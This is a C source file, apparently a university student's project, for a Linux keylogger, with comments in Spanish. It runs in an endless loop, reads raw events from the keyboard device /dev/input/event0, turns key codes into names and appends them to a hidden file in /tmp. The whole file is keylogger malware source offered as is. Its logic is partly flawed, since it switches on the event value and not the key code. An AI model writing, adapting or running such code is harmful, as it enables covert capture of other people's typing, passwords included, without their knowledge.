//UNAM-Becarios
//Leal Gonzalez Ignacio
//KeyLogegr

#include<stdio.h>
#include<stdlib.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>
#include<string.h>

//Estructura del evento de presionar una tecla
struct input_event {
    struct timeval time;
    unsigned short type;
    unsigned short code;
    unsigned int value;
};

//Definimos los valores de cada tecla
#define tecla1 "ESC"
#define tecla2 "1"
#define tecla3 "2"
#define tecla4 "3"
#define tecla5 "4"
#define tecla6 "5"
#define tecla7 "6"
#define tecla8 "7"
#define tecla9 "8"
#define tecla10 "9"
#define tecla11 "0"
#define tecla12 "-"
#define tecla13 "="
#define tecla14 "BACKSPACE"
#define tecla15 "TAB"
#define tecla16 "Q"
#define tecla17 "W"
#define tecla18 "E"
#define tecla19 "R"
#define tecla20 "T"
#define tecla21 "Y"
#define tecla22 "U"
#define tecla23 "I"
#define tecla24 "O"
#define tecla25 "P"
#define tecla26 "["
#define tecla27 "]"
#define tecla28 "ENTER"
#define tecla29 "LEFTCTRL"
#define tecla30 "A"
#define tecla31 "S"
#define tecla32 "D"
#define tecla33 "F"
#define tecla34 "G"
#define tecla35 "H"
#define tecla36 "J"
#define tecla37 "K"
#define tecla38 "L"
#define tecla39 ";"
#define tecla40 "'"
#define tecla41 "`"
#define tecla42 "LEFTSHIFT"
#define tecla43 "ANTIDIAGONAL"
#define tecla44 "Z"
#define tecla45 "X"
#define tecla46 "C"
#define tecla47 "V"
#define tecla48 "B"
#define tecla49 "N"
#define tecla50 "M"
#define tecla51 ","
#define tecla52 "."
#define tecla53 "/"
#define tecla54 "RIGHTSHIFT"
#define tecla55 "*"
#define tecla56 "LEFTALT"
#define tecla57 "ESPACIO"
#define tecla58 "CAPSLOCK"
#define tecla59 "F1"
#define tecla60 "F2"
#define tecla61 "F3"
#define tecla62 "F4"
#define tecla63 "F5"
#define tecla64 "F6"
#define tecla65 "F7"
#define tecla66 "F8"
#define tecla67 "F9"
#define tecla68 "F10"
#define tecla69 "NUMLOCK"
#define tecla71 "7"
#define tecla72 "8"
#define tecla73 "9"
#define tecla74 "-"
#define tecla75 "4"
#define tecla76 "5"
#define tecla77 "6"
#define tecla78 "+"
#define tecla79 "1"
#define tecla80 "2"
#define tecla81 "3"
#define tecla82 "0"
#define tecla83 "."
#define tecla86 "<"
#define tecla87 "F11"
#define tecla88 "F12"
#define tecla100 "RIGHTALT"
#define tecla181 "/"
#define tecla183 "IMPRPANT"
#define tecla184 "ALTGR"
#define tecla197 "PAUSA"
#define tecla199 "INICIO"
#define tecla200 "FLECHAARR"
#define tecla201 "REGPAG"
#define tecla203 "FLECHAIZ"
#define tecla205 "FLECHADER"
#define tecla207 "FIN"
#define tecla208 "FLECHAABA"
#define tecla209 "AVPAG"
#define tecla211 "SUPR"

int main(int argc, char *argv[])
{
	struct input_event ev;//Estructura del evento al presionar una tecla
	int fd, aux = 299, cont=2, cont1=0, fd2;
	char *archivo = "/dev/input/event0", *archivo2 = "/tmp/tecleado.txt";//archivos 
	while(1)//Ciclo para que siempre capte lo que se escribe
	{
		fd = open(archivo, O_RDONLY);//Abrimos el archivo del teclado
		fd2 = open(archivo2, O_WRONLY | O_CREAT | O_APPEND, 0644);/*Creamos y/o abrimos el archivo donde se almacenara lo que se escribi*/
		read(fd, &ev, sizeof(ev));//Leemos lo que contiene el archivo del teclado
		if(ev.value != aux)
		{			
			ev.value;//Mostramos el valor de lo que se escribio en pantalla 
			aux = ev.value;//Variable que nos sirve solo para mostrar una vez la tecla presionada
/*Switch con los diferentes casos al presionar una tecla guardando en el archivo lo que se presiono y mostrando en pantalla la tecla presionada*/
			switch(ev.value)
			{
				case 1: write(fd2, tecla1, strlen(tecla1)); 		
					break;	
				case 2: write(fd2, tecla2, strlen(tecla2)); 
					break;
				case 3: write(fd2, tecla3, strlen(tecla3)); 
					break;	
				case 4: write(fd2, tecla4, strlen(tecla4)); 
					break;	
				case 5: write(fd2, tecla5, strlen(tecla5)); 
					break;	
				case 6: write(fd2, tecla6, strlen(tecla6)); 
					break;
				case 7: write(fd2, tecla7, strlen(tecla7)); 
					break;	
				case 8: write(fd2, tecla8, strlen(tecla8)); 
					break;	
				case 9: write(fd2, tecla9, strlen(tecla9)); 
					break;	
				case 10: write(fd2, tecla10, strlen(tecla10)); 
					break;
				case 11: write(fd2, tecla11, strlen(tecla11)); 
					break;	
				case 12: write(fd2, tecla12, strlen(tecla12)); 
					break;	
				case 13: write(fd2, tecla13, strlen(tecla13)); 
					break;	
				case 14: write(fd2, tecla14, strlen(tecla14)); 
					break;
				case 15: write(fd2, tecla15, strlen(tecla15)); 
					break;	
				case 16: write(fd2, tecla16, strlen(tecla16)); 
					break;	
				case 17: write(fd2, tecla17, strlen(tecla17)); 
					break;	
				case 18: write(fd2, tecla18, strlen(tecla18)); 
					break;
				case 19: write(fd2, tecla19, strlen(tecla19)); 
					break;	
				case 20: write(fd2, tecla20, strlen(tecla20)); 
					break;	
				case 21: write(fd2, tecla21, strlen(tecla21)); 
					break;	
			       	case 22: write(fd2, tecla22, strlen(tecla22)); 
					break;
				case 23: write(fd2, tecla23, strlen(tecla23)); 
					break;	
				case 24: write(fd2, tecla24, strlen(tecla24)); 
					break;	
				case 25: write(fd2, tecla25, strlen(tecla25)); 
					break;
				case 26: write(fd2, tecla26, strlen(tecla26)); 
					break;
				case 27: write(fd2, tecla27, strlen(tecla27)); 
					break;	
				case 28: write(fd2, tecla28, strlen(tecla28)); 
					break;	
				case 29: write(fd2, tecla29, strlen(tecla29)); 
					break;	
				case 30: write(fd2, tecla30, strlen(tecla30)); 
					break;
				case 31: write(fd2, tecla31, strlen(tecla31)); 
					break;	
				case 32: write(fd2, tecla32, strlen(tecla32)); 
					break;	
				case 33: write(fd2, tecla33, strlen(tecla33)); 
					break;	
				case 34: write(fd2, tecla34, strlen(tecla34)); 
					break;
				case 35: write(fd2, tecla35, strlen(tecla35)); 
					break;	
				case 36: write(fd2, tecla36, strlen(tecla36)); 
					break;	
				case 37: write(fd2, tecla37, strlen(tecla37)); 
					break;	
				case 38: write(fd2, tecla38, strlen(tecla38)); 
					break;
				case 39: write(fd2, tecla39, strlen(tecla39)); 
					break;	
				case 40: write(fd2, tecla40, strlen(tecla40)); 
					break;	
				case 41: write(fd2, tecla41, strlen(tecla41)); 
					break;	
				case 42: write(fd2, tecla42, strlen(tecla42)); 
					break;
				case 43: write(fd2, tecla43, strlen(tecla43)); 
					break;	
				case 44: write(fd2, tecla44, strlen(tecla44)); 
					break;	
				case 45: write(fd2, tecla45, strlen(tecla45)); 
					break;	
				case 46: write(fd2, tecla46, strlen(tecla46)); 
					break;
				case 47: write(fd2, tecla47, strlen(tecla47)); 
					break;
				case 48: write(fd2, tecla48, strlen(tecla48)); 
					break;	
				case 49: write(fd2, tecla49, strlen(tecla49)); 
					break;	
				case 50: write(fd2, tecla50, strlen(tecla50)); 
					break;	
				case 51: write(fd2, tecla51, strlen(tecla51)); 
					break;
				case 52: write(fd2, tecla52, strlen(tecla52)); 
					break;	
				case 53: write(fd2, tecla53, strlen(tecla53)); 
					break;	
				case 54: write(fd2, tecla54, strlen(tecla54)); 
					break;	
				case 55: write(fd2, tecla55, strlen(tecla55)); 
					break;
				case 56: write(fd2, tecla56, strlen(tecla56)); 
					break;	
				case 57: write(fd2, tecla57, strlen(tecla57)); 
					break;	
				case 58: write(fd2, tecla58, strlen(tecla58)); 
					break;	
				case 59: write(fd2, tecla59, strlen(tecla59)); 
					break;
				case 60: write(fd2, tecla60, strlen(tecla60)); 
					break;	
				case 61: write(fd2, tecla61, strlen(tecla61)); 
					break;	
				case 62: write(fd2, tecla62, strlen(tecla62)); 
					break;	
				case 63: write(fd2, tecla63, strlen(tecla63)); 
					break;
				case 64: write(fd2, tecla64, strlen(tecla64)); 
					break;	
				case 65: write(fd2, tecla65, strlen(tecla65)); 
					break;
				case 66: write(fd2, tecla66, strlen(tecla66)); 
					break;	
				case 67: write(fd2, tecla67, strlen(tecla67)); 
					break;
				case 68: write(fd2, tecla68, strlen(tecla68)); 
					break;	
				case 69: write(fd2, tecla69, strlen(tecla69)); 
					break;	
				case 72: write(fd2, tecla72, strlen(tecla72)); 
					break;	
				case 73: write(fd2, tecla73, strlen(tecla73)); 
					break;	
				case 74: write(fd2, tecla74, strlen(tecla74)); 
					break;	
				case 75: write(fd2, tecla75, strlen(tecla75)); 
					break;	
				case 76: write(fd2, tecla76, strlen(tecla76)); 
					break;	
				case 77: write(fd2, tecla77, strlen(tecla77)); 
					break;	
				case 78: write(fd2, tecla78, strlen(tecla78)); 
					break;	
				case 79: write(fd2, tecla79, strlen(tecla79)); 
					break;	
				case 80: write(fd2, tecla80, strlen(tecla80)); 
					break;	
				case 81: write(fd2, tecla81, strlen(tecla81)); 
					break;					
				case 82: write(fd2, tecla82, strlen(tecla82)); 
					break;	
				case 83: write(fd2, tecla83, strlen(tecla83)); 
					break;	
				case 86: write(fd2, tecla86, strlen(tecla86)); 
					break;	
				case 87: write(fd2, tecla87, strlen(tecla87)); 
					break;	
				case 88: write(fd2, tecla88, strlen(tecla88)); 
					break;	
				case 100: write(fd2, tecla100, strlen(tecla100)); 
					break;
				case 181: write(fd2, tecla181, strlen(tecla181)); 
					break;	
				case 183: write(fd2, tecla183, strlen(tecla183)); 
					break;
				case 184: write(fd2, tecla184, strlen(tecla184)); 
					break;
				case 197: write(fd2, tecla197, strlen(tecla197)); 
					break;
				case 199: write(fd2, tecla199, strlen(tecla199)); 
					break;
				case 200: write(fd2, tecla200, strlen(tecla200)); 
					break;
				case 201: write(fd2, tecla201, strlen(tecla201)); 
					break;	
				case 203: write(fd2, tecla203, strlen(tecla203)); 
					break;	
				case 205: write(fd2, tecla205, strlen(tecla205)); 
					break;	
				case 207: write(fd2, tecla207, strlen(tecla207)); 
					break;
				case 208: write(fd2, tecla208, strlen(tecla208)); 
					break;	
				case 209: write(fd2, tecla209, strlen(tecla209)); 
					break;
				case 211: write(fd2, tecla211, strlen(tecla211)); 
					break;					
			}	
		}
		else
		{
			cont1 += 1;
		}
		if(cont1==2)
		{
			cont1 = 1;
			aux = 299;
		}	
		//Cerramos los archivos			
		close(fd);
		close(fd2);
	}	
}

